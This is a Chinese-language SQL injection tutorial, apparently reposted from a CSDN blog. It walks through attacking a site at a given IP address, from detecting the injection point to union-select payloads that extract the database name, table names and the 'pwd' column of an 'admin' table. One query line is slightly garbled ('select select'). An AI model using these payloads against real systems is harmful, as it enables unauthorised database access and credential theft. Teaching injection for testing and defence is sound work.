# SQL注入

来源：https://blog.csdn.net/carol980206/article/details/87905304

## 简介

SQL注入是比较常见的网络攻击方式之一，它不是利用操作系统的BUG来实现攻击，而是针对程序员编程时的疏忽，通过SQL语句，实现无帐号登录，甚至篡改数据库。

## SQL注入总体思路

1.寻找到SQL注入的位置

2.判断服务器类型和后台数据库类型

3.针对不通的服务器和数据库特点进行SQL注入攻击


## SQL注入攻击实例

### 检测注入点

首先，在 http://120.203.13.75:6815/?id=1 目标站点页面发现了 ?id，说明可以通过查询 id=1 的内容来获得页面。

这相当于查询语句：

	select * from [表名] where id = '1';

审查元素，并利用 f5 刷新页面。

分析出的 HTTP 数据包如下：

![](../Images/1.png)

请求中的参数为：查询字符串 id:1

![](../Images/2.png)

### 判断是否存在 SQL 注入可能

	http://120.203.13.75:6815/?id=1后加入一个 单引号，构成
	
	http://120.203.13.75:6815/?id=1'


此时的 SQL 查询语句变为：

	select * from 表名 where id =1';


SQL 语句未正确结束，因此返回了一个错误页面，如图所示：

![](../Images/3.png)


继续测试 and 1=1 和 and 1=2：

	http://120.203.13.75:6815/?id=1 and 1=1

这相当于 SQL 查询语句：

	select * from 表名 where id =1 and 1=1;

![](../Images/4.png)

	http://120.203.13.75:6815/?id=1 and 1=2 

这相当于 SQL 查询语句：

	select select * from 表名 where id =1 and 1=2;

SQL语句用 and 连接可以设置多个条件，目前返回一个永久为假的条件，因此页面返回错误，如图所示：

![](../Images/5.png)


**一个恒等式，一个恒不等式，输入 and 1=1 页面返回正常，而输入 and 1=2 时页面返回出错，说明 SQL 语句被执行，程序没有对敏感字符进行过滤。**

现在可以确定此处是一个 SQL 注入点，程序对带入的参数没有做任何处理，直接带到数据库的查询语句中。


## 数据库爆破

### 判断数据库类型以及版本

构造语句如下：

	http://120.203.13.75:6815/?id=1 and ord(mid(version(),1,1))>51 

发现返回正常页面，说明数据库是 MySQL，并且版本大于 4.0，支持 union 查询，反之是 4.0 以下版本或者其他类型数据库。

### 字段爆破

进一步猜测数据注入位置：

	http://120.203.13.75:6815/?id=1 order by 10 

这相当于 SQL 查询语句：

	select * from [表名] where id =1 order by 10;

返回错误，说明字段小于 10

返回成功，说明字段大于 10


采用二分查找法


### 数据库表爆破

确定字段之后，现在要构造联合查询语句 (union select)，语句如下：

	http://120.203.13.75:6815/?id=1 and 1=2 union select 1,2 

可以发现在页面中，原先的内容没有了，取而代之的是返回的数字 2，这个数字指的是我们可以把联合查询的对应位置替换为想要查询的关键字，比如版本，数据库名称，主要是用来探测 web 系统的信息。


### 用户名、密码

现在把 2 替换掉，先查询数据库名称，构造语句如下：

	http://120.203.13.75:6815/?id=1 and 1=2 union select 1,database() 

说明这个网站的数据库名称是 maoshe

用同样的手法查询表名，构造语句如下：

	http://120.203.13.75:6815/?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema='maoshe' 

再用同样的手法猜测密码和用户名字段：

	http://120.203.13.75:6815/?id=1 and 1=2 union select 1,pwd from admin



